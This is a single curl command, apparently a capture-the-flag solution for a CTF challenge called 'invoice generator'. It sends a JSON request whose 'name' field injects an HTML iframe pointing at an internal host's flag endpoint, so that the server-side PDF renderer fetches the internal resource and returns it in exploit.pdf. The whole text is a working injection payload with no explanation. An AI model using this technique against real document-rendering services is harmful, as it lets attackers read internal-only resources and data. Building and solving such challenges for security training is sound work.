curl -X POST https://lactf-invoice-generator-qgxhv.instancer.lac.tf//generate-invoice \
     -H "Content-Type: application/json" \
     -d '{
       "name": "<iframe src=\"http://flag:8081/flag\" width=\"500\" height=\"100\"></iframe>",
       "item": "pwn",
       "cost": "1",
       "datePurchased": "2026"
     }' --output exploit.pdf